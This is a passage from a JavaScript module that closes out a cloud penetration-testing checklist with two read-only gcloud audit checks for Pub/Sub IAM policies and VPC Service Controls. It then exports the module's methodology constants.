        command: "gcloud pubsub topics list && gcloud pubsub topics get-iam-policy <topic>",
        tool: "gcloud CLI",
        risk: "High - Message interception, unauthorized publishing"
      },
      {
        name: "VPC Service Controls",
        description: "Verify VPC Service Controls are configured to prevent data exfiltration from sensitive projects.",
        command: "gcloud access-context-manager perimeters list --policy=<policy-id>",
        tool: "gcloud CLI",
        risk: "High - Data exfiltration from GCP services"
      }
    ]
  }
];

// =============================================================================
// Module Exports
// =============================================================================

module.exports = {
  PENTEST_METHODOLOGY,
  WEB_APP_METHODOLOGY,
  AD_METHODOLOGY,
  API_METHODOLOGY,
  MOBILE_METHODOLOGY,
  CLOUD_METHODOLOGY
};
